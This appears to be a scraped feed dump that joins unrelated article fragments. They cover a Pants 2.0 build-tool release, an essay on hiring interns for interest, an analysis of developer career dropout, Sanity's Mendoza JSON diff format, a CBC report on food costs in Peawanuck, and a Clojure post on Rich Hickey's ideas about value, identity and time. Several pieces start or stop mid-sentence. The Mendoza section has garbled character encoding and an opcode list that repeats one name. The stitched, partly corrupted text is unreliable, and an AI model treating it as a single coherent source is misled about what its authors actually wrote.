href="https://en.wikipedia.org/wiki/Pure_function">pure</a> Python 3 <a href="https://docs.python.org/3/library/asyncio-task.html">async coroutines</a>. So a build rule can depend not only on its inputs, but can also await on new data at runtime - all of which is precisely tracked for invalidation and caching. This gives us the best of both worlds: logic that is properly isolated from side-effects, and is therefore amenable to caching, concurrent execution and remoting, while still allowing the use of natural control flow.</p><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/caching.gif" alt=""><figcaption>We run both tests, then add a syntax error to one test and rerun; the unmodified test uses the cache and is isolated from the syntax error.</figcaption></figure><h3 id="lesson-4-almost-everyone-needs-to-customize-their-builds">Lesson #4: Almost everyone needs to customize their builds</h3><p>Most teams have custom build steps, so extensibility is a key feature in any build system. Pants v2 is built around a <a href="https://www.pantsbuild.org/docs/plugins-overview">plugin architecture</a>. You can write your own rules using the same API as the built-in functionality. So your custom build logic will enjoy the same fine-grained invalidation, caching, concurrency and remote execution abilities as the core Pants code.</p><h2 id="pants-2-0-0-is-out-now-">Pants 2.0.0 is out now!</h2><p>All this leads me to the happy announcement that <a href="https://pypi.org/project/pantsbuild.pants/2.0.0/">Pants 2.0.0</a>, the first stable release of Pants v2, is out now! 2.0.0 is the culmination of years of design and development work, and many months of beta testing at several organizations. So we're really happy, proud (and relieved…) to finally have it ready for general use. </p><p>You can see what Python tools Pants currently supports <a href="https://www.pantsbuild.org/docs/python">here</a>. There are also commands for querying and understanding your dependency graph, and a robust help system. &nbsp;We're adding support for additional tools and features all the time, and it's straightforward to implement your own. Beta users have already written their own logic for Cython and docker, for example. </p><p>Now is a great time to adopt Pants 2.0.0! The team that developed Pants v2 is <a href="https://www.pantsbuild.org/docs/community">ready to help you</a> onboard, answer any questions, and even pair with you to help you write any custom build logic. We're also eager to get feedback, bug reports and suggestions for what features we should focus on in the next weeks and months of development.</p><p>Pants v2 is developed by a helpful open source community, is funded by a 501(c)6 non-profit, and has excellent support available. If you have a growing Python codebase, and want to take Pants 2.0.0 for a spin, <a href="https://www.pantsbuild.org/docs/community">let us know</a>. We'd love to fit you with some new Pants today!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>October 2020</p><p>Aaron Chen</p><p>The vast majority of software-related internships should weigh meaningful interest over technical experience.</p><p>If an applicant can effectively display <strong>qualified interest</strong> through a well-thought and value-aligned argument, then they deserve that spot over those who don’t display that initiative. <em><strong>Even</strong> if there are others that seem more technically qualified</em>. </p><p>In a world of hiring, meritocracy reigns supreme <!-- -->[1]<!-- -->. And for good reason. The most effective individuals are the most skilled. A for-profit company’s essential and primary goal is to make money. To do that, a company needs to provide a product or service at a certain level of quality and form. At the base level, it’s simple: to create the best product, hire the best engineers. But these open positions inherently have a certain expectation of performance granted upon them. Internships on the other hand are fundamentally different.</p><p>One primary difference is that they’re learning-focused <!-- -->[2]<!-- -->. Companies hire full-time engineers with the expectation that they’ll be able to produce, and not primarily to learn <!-- -->[3]<!-- -->. On the other hand, interns are hired so they’ll learn the product and company. At its center internships are used to test candidates in a real world environment <!-- -->[4]<!-- -->. Hiring full-time engineers are based on the presumption that these individuals know how to perform in or at least navigate a real company environment already <!-- -->[5]<!-- -->. And for that reason, they should be treated differently. <strong>Meritocracy need not be the highest measure for hiring an intern</strong>. When present, well-intentioned and meaningful interest should be given precedence over experience. </p><p>I say this acknowledging that there should still be some minimum standard of technicality that the candidate has. They should be interested in programming after all! Deciding that minimum standard is a little up in the air though. What if the standards are <em>too</em> low? How do we differentiate between applicants at scale? First, well that’s already a problem with recruiting. Scaling to large numbers is incredibly difficult, and being able to do so currently, like your Google’s and Amazon’s often entail an already very frustrating and hated interviewing process. Second, your technical standards work in tandem with the entire application itself––I almost want to <strong>guarantee</strong> you that the amount of individuals who are willing to put in that effort to write a thoughtful, and cohesive letter are few to none in comparison to the bulk of applications <!-- -->[6]<!-- -->.</p><p>So I think those standards shouldn’t be set high.</p><p>Say you’re hiring for a frontend internship position. This position entails working on a server-side web framework––let’s use Ruby on Rails. As a hiring manager (lead talent guy or whatnot), you have to pick between two people: an individual who’s just submitted a resume that has 1 - 2 years of experience in Ruby on Rails, passes whatever technical examination you give him/her with high marks, and seems to be a smart and amiable individual on phone. And then there’s the applicant who’s had experience in Java for two years, a bit of JS/CSS/HTML for personal sites, and does a little below average on the technical portion <!-- -->[7]<!-- -->. But they also submit an extensive 1.5 page cover letter, detailing why they wanted to work at Company X, and also describes why they believe they’ll be a right fit <!-- -->[8]<!-- -->. This applicant, like the other, appears to be a good person, and displays similar levels of enthusiasm as in the letter on phone <!-- -->[9]<!-- -->.</p><p>If I were in that position of making the choice, I’d pick the latter. </p><p>I’d do so <em>knowing</em> that this applicant isn’t as technically qualified as the former. But, I’d also make this decision knowing this candidate displayed genuine interest, logically and persuasively argued his/her case in a manner that showed critical thinking and enthusiasm, and had the baselines for a programmer to adequately navigate the dynamics of software. The other candidate’s application was <em>just</em> a resume. And while they were technically qualified and adequately amalgable with the company, they just didn’t have the initiative or <em>spark</em> in their application. I think those sparks can make or break a company culture.</p><p>You want people that <strong>want to work at your company</strong>. The other candidate may have been a fine full-time too. But I think that spark goes a long way: you can rest assured knowing they have that demonstrated interest in learning the technology, product, and company. With that demonstrated interest, they’ll learn with minimal personal friction, they’ll enjoy being at your company, and the fact that you gave them a chance while they were under-qualified sure does give them even more appreciation and willingness to go above and beyond. We should keep in mind: this is an <strong>internship position</strong>. They are there to learn and to be tested. Interest should be paramount to these types of positions. In our situation, one candidate displayed that initiative more so than the other. </p><p>Take a chance on these types of applicants I say. They’ll exceed your expectations.</p><p><strong>Disclaimer:</strong>
I’ve been in this situation before. To be left with a simple 3 sentence email rejection after writing extensive cover letters, with no acknowledgement whatsoever of what I wrote hurts quite a bit. Of course, I never knew if they hired someone else after me because they seemed to be more skilled, but I think it can be easily assumed they did (provided they still had space! Which, if you have a job opening on Lever, then that should be the case).</p><p>Perhaps, this comes off as a salty rant, or maybe it has some substance. Who knows. I’d love to hear any critique or thoughts on this area either way.</p><p>--</p><p>[1]<!-- --> We don’t acknowledge any role if any that diversity may play within this process. I think that discussion should be reserved for a later time. </p><p>[2]<!-- --> Other differences include the time-span (months compared to however long a FTE stays on with the company) and mentorship (the type and the extent of it).</p><p>[3]<!-- --> Given a specific time span after hiring. Of course, incoming engineers learn some way or another. But not necessarily with the same focus as say an intern.</p><p>[4]<!-- --> Real world environment as in there is revenue tied in, one way or another, to the product/feature at hand and so the company places real value in it. There are internships that don’t do this, and instead use dummy projects interns work on. I’m not going to address those types (much less encourage that strategy either!).</p><p>[5]<!-- --> I use full-time hires as a word for engineers who aren’t interns but rather your “typical” engineer at a company. Obviously though, many internships are full-time too. But you know what I mean.</p><p>[6]<!-- --> Differentiating between varying levels of interest (between a letter, conversation, etc.) is definitely a good thing to wonder about. If you’re at the point where you have to do that though, I’d have to give you props! Sadly, I don’t have a very thought-out answer for it right now. But, I bet there are very <strong>few</strong> individuals who’ll have to deal with that. Barely any applicants are that <em>interested</em> in the companies they apply to, sadly. The game itself is spray and pray (sample size: 1 college student).</p><p>[7]<!-- --> For simplicity’s sake, a technical portion that measures general programming paradigms and concepts.</p><p>[8]<!-- --> Of course, a not-so-well written cover letter really isn’t going to go well. But, if you have an individual who’s willing to take that extra step and write an extensive letter like such, you’re probably not going to encounter a poorly written one. </p><p>[9]<!-- --> At this point, you’ve gauged the company fit for these individuals on the phone. But, we should also acknowledge there are many individuals you’ll miss if you’re analyzing the individuals you did talk to on the phone. </p></article></div></div>]]>

                    <p>We will never have enough software developers.</p><p>Developers are dropping out of the profession in large numbers despite efforts to grow the number of computer science graduates and software engineers.</p><p>Here's why.</p><h2 id="developer-dropout-is-real">Developer dropout is real</h2><p>Software development has a <em>serious</em> retention problem:</p><ul><li>At age 26, 59% of engineering and computer science grads work in occupations <em>related</em> to their field of study. By age 50, only 41% work in the same domain, meaning a full <strong>~30% drop out of the field by mid-career</strong></li><li>In contrast, engineering and computer science majors who join <em>unrelated</em> fields upon graduation retain at much higher rates, with only 10-15% switching out after the age of 26:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/W-kECKz1nw.png"></figure><p>Engineers often leave engineering for non-STEM management roles. Graduation into management is not surprising. What's surprising is that these are <strong>non-STEM</strong> positions. Engineers swap technical roles for <em>non-technical</em> roles over time.</p><p>This phenomenon, which I'll call "<strong>developer dropout</strong>," is a real problem. What's behind it?</p><!--kg-card-begin: html--><section>

</section><!--kg-card-end: html--><h2 id="out-with-the-old-skills-in-with-the-new-skills">Out with the old skills, in with the new skills</h2><p>Programming-related jobs have high rates of skill turnover. Over time, the types of skills required by companies hiring software developers change more rapidly than any other profession.</p><p>To demonstrate this, <a href="https://academic.oup.com/qje/article/135/4/1965/5858010">researchers</a> analyzed job postings on more than 40,000 online job boards and company websites between 2007 and 2019, controlling for employer, location, and occupation. They defined "new" skills as those that were rare or non-existent in 2007 but prevalent in 2019 and "old" skills as those that were prevalent in 2007 but rare or extinct in 2019.</p><ul><li>While only 30% of all job vacancies required at least one new skill by 2019, <strong>47% of computer and mathematical jobs required at least one new skill</strong> (i.e. a skill that was not common back in 2007)</li><li>This compares to <em>less than 20%</em> of jobs in fields like education, law, and community and social services</li><li>In addition, <strong>16% of jobs in computer and mathematical fields in 2007 required a skill that was obsolete by 2019</strong> (i.e. a skill that was common in 2007 but relatively rare in 2019), more than double any other job category:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/azDsA9n3rx.png"></figure><p>About a third of the change in required skills in computer-related occupations is due to specific new software:</p><ul><li>The fastest-growing software skills between 2007 and 2019 include <strong>Python, R, and Apache Hadoop</strong></li><li>Software that was popular in 2007 but effectively obsolete by 2019 includes QuarkXpress, ActionScript, Solaris, IBM Websphere, and Adobe Flash (ah, finally a name I recognize)</li></ul><p>Data science, machine learning, and AI saw big increases among technology-intensive jobs as well. For example, the number of STEM-related jobs requiring skills in machine learning and AI grew more than 4x from 2007-2017, touching more than 15% of STEM jobs:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Pc3AjVflhW.png"></figure><p>To better compare rates of skill change across occupations, the researchers came up with a measure of skill change that tracks the absolute growth or decline of various skills within each profession from 2007 to 2019. Occupations whose required skills change rapidly in prevalence among job postings receive a high score, while jobs whose skills do not change much receive a lower score:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/xfeKvOWxo-.png"></figure><ul><li><strong>Computer-related occupations receive the highest score by far, 4.8</strong>. Note that the mean and standard deviation of this measure are ~3 and ~1 respectively, so computer-related jobs are <strong>nearly two standard deviations away from the typical job in America</strong></li><li>Meanwhile, jobs in education and and those involving manual labor have very low skill change scores, typically less than 2.</li></ul><p>We can get even more granular and look at specific job roles. This level of detail makes the difference even more stark (only showing the fastest changing roles):</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/OwoB5xsSdO.png"></figure><p>Web development has the highest rate of skill change <em>among all jobs in the country</em>. Next up are sales engineers, another often technical role. Database administrators, computer network architects, sysadmins, and application developers all make the top 10, and we see many other technical roles among the top 30. The mean and standard deviation are similar here, placing web development <strong>more than 3 standard deviations away from the typical job in America</strong> in terms of skill change over time.</p><p>Suffice to say, <strong>software development is a rapidly changing profession</strong>.</p><p>You might think, however, that skill change would eventually settle down as one becomes more experienced.</p><p><em>You'd be wrong.</em> The skills for software engineering jobs change rapidly throughout the entire career lifecycle:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/7ItjXMaTE-.png"></figure><ul><li>In entry-level roles in computer and engineering occupations all the way through those requiring 12+ years of experience, <strong>the proportion of job postings requiring at least one new skill in 2019 was effectively the same, 40-45%</strong></li><li>In contrast, <strong>29% of entry-level non-computing and engineering roles in 2019 required at least one new skill, but this proportion declines to 24%</strong> for jobs requiring more than four years of experience</li></ul><blockquote>This means that experienced STEM workers seeking employment in 2019 are often required to possess skills that <strong>were not required</strong> when they entered the labor market in 2007 or earlier.</blockquote><p>Software engineers <strong>never</strong> escape the skill-change vortex, even many years into their careers. Experienced engineers must learn and adopt technologies that didn't even exist when they started out. Developers must constantly retool themselves, even well after their <a href="https://whoisnnamdi.com/college-degrees-software-engineers/">formal education</a> ends.</p><h2 id="nothing-s-changed-but-my-change"><a href="https://youtu.be/m1ERvlxgCD8?t=166">Nothing's changed but my change</a></h2><p><strong>College majors associated with faster changing jobs pay more early on.</strong></p><ul><li>In professions with one standard deviation increased skill change, pay is <strong>~30%</strong> higher in the first few years of one's career</li><li>If we exclude both the fastest and slowest-changing fields (Engineering/Computer Science at the high end, Health/Education at the low end), the early earnings premium for faster-changing roles increases to <strong>~60%</strong>:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/heMo13OsG1.png"></figure><p><strong>Fast-changing fields pay better.</strong></p><p>Notice however that the pay advantage declines over time. By the time one approaches the age of 50, the pay premium for working in rapidly changing fields falls dramatically to only 20-30% vs slower changing professions.</p><p>Here's another way to see the eroding pay advantage. The below chart simulates the earnings of the average worker by category of college degree from ages 23 to 50 in 2016 dollars.</p><ul><li>Computer science and engineering grads start off with sizable advantage vs any other major</li><li>However, this premium <em>falls</em> over time as the earnings of CS and engineering graduates plateau over time while the earnings of their peers grow <em>faster</em> for <em>longer</em></li><li>In fact, <strong>life and physical science graduates' earnings surpass their computer and engineering classmates by the age of 40</strong>:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Lifecyle-Earnings-by-Degree-Category.png"></figure><p>Excluding business majors, the earnings premium of software engineering declines over time in both percentage <em>and</em> absolute dollar terms, to the point where engineers barely out-earn social science majors:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Engineering-_-Computer-Science-Earnings-Premium.png"></figure><p>But the focus on college major is somewhat misleading. This phenomenon has less to do with one's field of study and more to do with <em>choice of occupation</em>.</p><p>To show this, researchers plotted the earnings premium of various categories workers relative to those with a non-Engineering/Computer Science major working in a non-Engineering/Computer Science job.</p><ul><li>Workers who major in Engineering or Computer Science but work in unrelated fields actually see their earnings advantage <em>compound</em> over time, rather than decline</li><li>On the other hand, regardless of major, individuals who work in Engineering or Computer Science jobs see their earnings advantage erode over the years:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/OFffH9kBKA.png"></figure><blockquote><strong>Declining relative returns is a feature of STEM jobs, not majors.</strong> The earnings premium for non-STEM majors in STEM occupations starts off near 40%, but declines to 20% within a decade. In contrast, the relative earnings advantage grows over time for computer science and engineering majors working in non-STEM occupations.</blockquote><p>The <strong>profession</strong> of software development drives the declining earnings premium, <strong>not the college major</strong>.</p><p>In fact, computer science majors who work in non-CS fields experience the <em>opposite</em> dynamic of their non-developer peers — their relative earnings premium rises as they advance. A CS major who eschews the profession doesn't earn much more than otherwise similar non-CS majors early on, but eventually out-earns their peers by nearly 20%.</p><p>OK, that's enough about <em>what</em> is happening. Now let's see <em>why</em> it's happening.</p><h2 id="human-capital-depreciates-too"><em>Human</em> capital depreciates too</h2><p>Imagine a simple model where workers choose their profession in order to maximize income, which is a derivative of their own skill or human capital. Over time, workers gain new skills, while the value of their existing skills depreciates somewhat due to changing times.</p><p>Some workers, endowed with superior ability, learn faster than others, picking up skills at a quicker pace. Those workers will tend to sort into high-skilled, fast-changing professions initially, maximizing their early career earnings. Less impressive workers will sort into low-skilled, slower-changing professions.</p><p>In a world where human capital never depreciated, we could imagine that high-skilled individuals like software developers would maintain a relative human capital (and earnings) advantage over other professionals, leading to consistently increasing pay and a stable relative premium:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Human-Capital--w_o-Depreciation-.png"></figure><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Software-Engineering-Human-Capital-Premium--w_o-Depreciation-.png"></figure><p>But, if human capital depreciates over time and that rate of depreciation is higher in rapidly-changing fields like software development, then developers' initial advantage would erode over time, narrowing the gap vs. non-developers:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Human-Capital--w_-Depreciation-.png"></figure><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Software-Engineering-Human-Capital-Premium--w_-Depreciation-.png"></figure><p>This simple model helps explain what we see in the data — the software engineering earnings advantage disappears as the <em>effective</em> human capital gap narrows.</p><blockquote>Applied majors such as computer science, engineering, and business teach vintage-specific skills that become less valuable as new skills are introduced to the workplace …</blockquote></div></section></article></div></div></div>

As the user picked various document versions to compare we wanted to be able to quickly reconstruct a specific section of the history of a document. </p><figure><div role="button"><div data-has-aspect="false"></div></div><figcaption>Review Changes for Sanity Studio. Powered by Mendoza.</figcaption></figure><p>For text diffs, we use the <a>diff-match-patch format</a>, and we just assumed someone would have implemented a similarly efficient and compact diff format for JSON documents, but no such luck. If we wanted a general JSON diff format that was super compact and fast to apply, we would have to invent it ourselves. And thus, Mendoza, the totally non-human readable diff format for structured JSON documents, was born.</p><p>Mendoza is:</p><ul><li>Lightweight JSON format</li><li>A flexible format that can accommodate more advanced encodings in the future</li><li>As a Go library for encoding and decoding</li><li>A JavaScript library for decoding</li><li>Efficient handling of the renaming of fields</li><li>Efficient handling of reordering of arrays</li><li>Not designed to be human-readable</li></ul><p>Mendoza differs (hah!) from normals diffs as they are:</p><ul><li>Made for humans to read and understand and based on simple operations (like keep, insert, and delete text)</li><li>Possible to apply even if the source has changed a bit by including some of the contexts around every part that has changed</li><li>Designed for text, and not structured documents</li></ul><p>Now, this is great when you are collaborating with humans on code development and use something like git to track your changes. What it isnâ€™t great for, however, is expressing differences between structured documents (such as JSON) in a compact manner that can be efficiently transferred over the network and parsed in JavaScript inside of browsers.</p><div data-block-key="27e85758c59a"><h2><a id="most-diffs-arent-meant-for-machines-27e85758c59a"></a><a href="#most-diffs-arent-meant-for-machines-27e85758c59a"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 24"><path d="M0 0h24v24H0z" fill="none"></path><path fill="currentColor" d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a>Most diffs aren't meant for machines</h2></div><p>Most diff formats are made to be human-readable.

The integers are <em>opcodes</em> (short for â€œoperation codesâ€�), 8-bit numbers that correspond to an operation. Opcodes take parameters as strings, positive numbers, or JSON values (that is: the actual data that is changing). The list of available opcodes is as follows, notice that 10-18 are composites of the preceding ones:</p><ul><li>0 <code>Value<!-- -->â€‹ </code></li><li>1 <code>Copy<!-- -->â€‹ </code></li><li>2 <code>Blank<!-- -->â€‹</code></li><li>3 <code>ReturnIntoArray<!-- -->â€‹ </code></li><li>4 <code>ReturnIntoObject<!-- -->â€‹ </code></li><li>5 <code>ReturnIntoObjectSameKey<!-- -->â€‹ </code></li><li>6 <code>PushField<!-- -->â€‹ </code></li><li>7 <code>PushElement<!-- -->â€‹ </code></li><li>8 <code>PushParent<!-- -->â€‹ </code></li><li>9 <code>Pop<!-- -->â€‹ </code></li><li>10 <code>PushFieldCopy</code></li><li>11 <code>PushFieldBlank</code></li><li>12 <code>PushElementCopy</code></li><li>13 <code>PushFieldBlank</code></li><li>14 <code>ReturnIntoObjectPop</code></li><li>15 <code>ReturnIntoObjectSameKeyPop</code></li><li>16 <code>ReturnIntoArrayPop</code></li><li>17 <code>ObjectSetFieldValue</code></li><li>18 <code>ObjectCopyField</code></li><li>19 <code>ObjectDeleteField</code>â€‹ </li><li>20 <code>ArrayAppendValue</code>â€‹ </li><li>21 <code>ArrayAppendSlice<!-- -->â€‹</code></li><li>22 <code>StringAppendString<!-- -->â€‹</code></li></ul><p>Mendoza reads these opcodes from the patch and produces the resulting document from them. Depending on the patch, Mendoza might choose not to strictly follow the opcodes but take a simpler path. If every field and value has changed, for example, itâ€™s more efficient just to replace the whole document with the new data without going through all the operations. Or if you have a list of objects where one has moved to another position and changed a key-value, Mendoza will manage to go back to the original and represent the change in a cheap way.</p><p>Mendoza is implemented in Go and can be found in this <a href="https://github.com/sanity-io/mendoza">GitHub repository</a>. We have also made <a href="https://github.com/sanity-io/mendoza-js">a parser for Mendoza patches in JavaScript</a>, that you can use in your own application. </p><p>Of course, you can dive into <a href="https://github.com/sanity-io/sanity/blob/a3f7158016d63728a9b435e6ab444ff2b90fd424/packages/%40sanity/desk-tool/src/panes/documentPane/documentHistory/history/timeline.ts#L421">the source code for the Sanity Studio</a> and explore how Mendoza is used there. If you want a slightly simpler use-case, you can also <a href="https://github.com/sanity-io/groq-store/blob/main/src/patch.ts">check out how weâ€™re using Mendoza to simulate a part of Sanityâ€™s real-time datastore</a> in the browser to power the <a href="https://github.com/sanity-io/next-sanity">real-time preview for Next.js</a>. </p><p>Naming a project is always difficult. Since this project is focused on representing changes between <em>JSON</em> documents I naturally started thinking about names like "JSON differ, JSON changes, JSON patch, â€¦". However, most of these names have already been used by existing projects. While I was muttering "JSON, JSON, JSON" it suddenly turned into "JSON, JSON, Jason, Jason Mendoza".</p><p>Jason Mendoza is a character from the show The Good Place, and while this project has little in common with the stupidest DJ from Florida, at least it's short and catchy.</p><p>Since a Mendoza patch is just describing the effect of a change it is also limited to work for the documents it was based on. It doesnâ€™t come with guarantees for consistency if the document you apply it on has changed from the original in meanwhile. This is one of the tradeoffs that we needed to do to make it really compressed. </p></div></div></div>]]>

But now, last couple years has been like one week of the fish run," he said.&nbsp;</p>  <p>Traditionally, Hunter and his community would have specific seasons for hunting geese, fish or caribou,&nbsp;but he says that's been affected by changes in the climate.</p>  <p>"With these changes, if you missed one of those seasons —&nbsp;because we tried to harvest enough to last 12 months of the year — if you missed that, if we missed this year's fish, you won't have any fish for a year," he explained.</p>  <p>Hunter says that might mean people have to turn to buying groceries, which are expensive. He said a loaf of bread might cost around $6, eggs about the same, while a can of pop might be almost $5.&nbsp;</p>  <p>"So what happens with the people that cannot afford food that they turn to Kraft dinner, canned food, cereal and they become sick with diabetes. They become overweight. That's the only thing they can afford," he said.</p>  <p>He said that if his family were forced to rely solely on the grocery store in his community&nbsp;they would not be able to make ends meet.&nbsp;</p>  <p>In the report, Human Rights Watch notes that an average family of four in Peawanuck must spend around 30 percent more to buy a standard selection of healthy food each month, compared with&nbsp;a family in Toronto.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5774764.1603477193!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/sam-hunter.jpg 300w,https://i.cbc.ca/1.5774764.1603477193!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/sam-hunter.jpg 460w,https://i.cbc.ca/1.5774764.1603477193!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/sam-hunter.jpg 620w,https://i.cbc.ca/1.5774764.1603477193!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sam-hunter.jpg 780w,https://i.cbc.ca/1.5774764.1603477193!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/sam-hunter.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5774764.1603477193!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sam-hunter.jpg"></p></div><figcaption>Sam Hunter paddles a canoe. <!-- --> <!-- -->(Isabel Souliere/Missinaibe Cree  )</figcaption></figure></span></p>  <p>Hunter said that he has been collaborating with Human Rights Watch for a few years, and feels that it is important for people living in the south of the country to understand what is going on.</p>  <p>"What used to take 4000 years, it's happening in decades now, it's happening really fast.

        <div class="page" id="content">
          
          <p>06 December 2012</p>
          <p><img src="http://www.flyingmachinestudios.com/assets/images/posts/rich-hickey-function.png" alt="The Rich Hickey Function"></p>
          
          <p>Part of my excitement in learning Clojure has been being exposed to
          Rich Hickey's thoughts on programming. Rich Hickey has a clear,
          consistent way of viewing fundamental programming concepts that I
          think any programmer would benefit from. Every time I watch one of his
          talks, I feel like someone has gone in and organized my brain.</p>
          
          <p>In this article (and more to come (possibly)), I begin my attempt to
          catalog Mr. Hickey's unique viewpoint. Eventually, I would like to
          produce a concise summary of his ideas. My hope is that this will
          provide an easily-scannable reference to Clojurists and an accessible
          introduction to non-Clojurists.</p>
          
          <p>What follows is derived from Rich Hickey's talk,
          "<a href="http://www.infoq.com/presentations/Are-We-There-Yet-Rich-Hickey">Are we there yet?</a>"</p>
          
          <h2>Introduction</h2>
          
          <p>Today's OOP languages - Ruby, Java, Python, etc. - are fundamentally
          flawed. They introduce
          <a href="http://en.wikipedia.org/wiki/No_Silver_Bullet">accidental complexity</a>
          by building on an inaccurate model of reality. Where they have
          explicit definitions for the following concepts, the definitions are
          wrong:</p>
          
          <ul>
          <li>Value</li>
          <li>State</li>
          <li>Identity</li>
          <li>Time</li>
          <li>Behavior</li>
          </ul>
          
          <p>Below, we'll contrast the OOP viewpoint on each of these topics with
          the Functional Programming viewpoint. But first, we'll compare the
          models of reality which underlie OOP and FP. It's this underlying
          difference which gives rise to their different approach to the topics
          above.</p>
          
          <h2>Metaphysics, Programming, and You: Comparing OOP and FP</h2>
          
          <p>When talking about metaphysics things tend to get a little fuzzy, but
          hopefully this will all make sense.</p>
          
          <p>As the ever-trusty
          <a href="http://en.wikipedia.org/wiki/Metaphysics">Wikipedia</a> explains,
          metaphysics attempts to answer two basic questions in the broadest
          possible terms:</p>
          
          <ul>
          <li>What is there?</li>
          <li>What is it like?</li>
          </ul>
          
          <p>Rich Hickey explains the difference between OOP and FP metaphysics by
          contrasting their explanations of what a river is. </p>
          
          <h3>Object Oriented Programming</h3>
          
          <p>In OOP metaphysics, a river is something which actually exists in the
          world. I know, I know, I can hear what you're saying: "Uh... yeah?
          So?" But believe me, the accuracy of that statement has caused many a
          sleepless night for philosophers.</p>
          
          <p>The wrinkle is that the river is always changing. Its water never
          ceases to flow. In OOP terms, we would say that it has mutable state,
          and that its state is ever fluctuating.</p>
          
          <p>The fact that the state of the River Object and that Objects in
          general are never stable doesn't stop us from nevertheless treating
          them as the fundamental building blocks of programs. In fact, this is
          seen as an advantage of OOP - it doesn't matter how the state changes,
          you can still interact with a stable interface and all will work as it
          should. An object can change, but to all observers it is still
          considered the same object.</p>
          
          <p>This conforms to our intuitive sense of the world. The position of the
          electrons of the coffee in my mug matters naught; the coffee still
          interacts with my taste buds in the way I expect.</p>
          
          <p>Finally, in OOP, objects do things. They act on each other. Again, this
          conforms to our intuitive sense of the world: change is the
          result of objects acting upon each other. A Person object pushes on a
          Door object and enters a House object.</p>
          
          <h3>Functional Programming</h3>
          
          <p><img src="http://www.flyingmachinestudios.com/assets/images/posts/fp-metaphysics.png" alt="FP Metaphysics"></p>
          
          <p>In FP metaphysics, we would say that we never step in the same river
          twice. What we see as a discrete <em>thing</em> which actually exists in the
          world independent of its mutations is in reality a succession of
          discrete, unchanging things.</p>
          
          <p>The "river" is not a thing in and of itself; it's a concept
          that we superimpose on a succession of related phenomena. This concept
          is very useful - I won't belabor that point - but it is just a
          concept.</p>
          
          <p>What really exists are atoms (in the sense of atomic, unchanging,
          stable entities) and processes. The river is not a stable object;
          rather, it is a succession of related atoms which are generated by
          some kind of process.</p>
          
          <p>These atoms don't act upon each other and they can't be changed. They
          can't <em>do</em> anything. Change is not the result of one object acting on
          another; change is the result of a process being applied to an
          unchangeable atom. To say that something has changed is to say, "Oh,
          there's a new atom in this stream of atoms." It's like saying that
          HEAD points to a new commit in your Git repo.</p>
          
          <p>OK! Enough with metaphysics. Now let's describe the more immediately
          useful topics, starting with Value.</p>
          
          <h2>Value</h2>
          
          <p>It's obvious that numbers like 3 and 6 and 42 are values. Numbers are
          stable, unchanging.</p>
          
          <p>It should also be obvious that OO languages have "no proper notion" of
          values in this sense. As Rich Hickey points out, you can create a
          class whose instances are composed of immutable components, but there
          is no high-level concept of immutable value implemented as a first
          class construct within the class.</p>
          
          <p>This is one of the main causes of headaches when doing OOP. How many
          times have you pulled your hair out trying to figure out how an
          object's attribute got changed? The fact is, in OO languages there is
          no built-in mechanism to ensure that the object you're dealing with is
          stable.</p>
          
          <p>This is the big reason why concurrent programming is so difficult.
          Even in single-threaded programs this is a problem, and it's one of
          the reasons why we develop sprawling test suites. You can't be sure if
          a method call on your Toupee object is somehow going to cause a change
          in your HipsterGlasses object.</p>
          
          <p>By contrast, in FP languages emphasis is placed on working with
          immutable values. Since these values can't change, a whole class of
          problems simply disappears.</p>
          
          <h2>Identity</h2>
          
          <p>In the video, Mr. Hickey says:</p>
          
          <blockquote>
          <p>The biggest problem we have is we've conflated two things. We've
          said the <em>idea</em> that I attach to this thing that lasts over time
          <em>is</em> the thing that lasts over time.</p>
          </blockquote>
          
          <p>In FP, identity is essentially a name we give to a sequence of related
          atoms. "River" refers to the sequence R1, R2, R3, etc, produced by the
          river process. This is directly analogous to HEAD in Git - it's just a
          name which is used to refer to actual values. In OO, there really
          isn't such a distinction.</p>
          
          <p>Or as the man himself says, </p>
          
          <blockquote>
          <p>Identity is a putative entity we associate with a series of causally
          related values (states) over time. It's a label, a construct we use
          to collect a time series.</p>
          </blockquote>
          
          <h2>State</h2>
          
          <p>In OO, there is no real clear definition of state. Maybe it's, "the
          values of all the attributes within an object right now." And it has
          to be "right now", because there's no language-supported way of
          holding on to the past.</p>
          
          <p>This becomes clearer if you contrast it with the notion of identity in
          FP. In the Hickeysian universe, a State is a specific value for an
          identity at a point in time. (For me, this definition really clarified
          my own thoughts.)</p>
          
          <h2>Time</h2>
          
          <p>There's no real notion of time in OO. Everything's just "right now".
          This is part of what causes problems in concurrent programs.</p>
          
          <p>By contrast, in the FP worldview we've been exploring, time is
          well-defined. Time is a by-product of ordering states within an
          identity.</p>
          
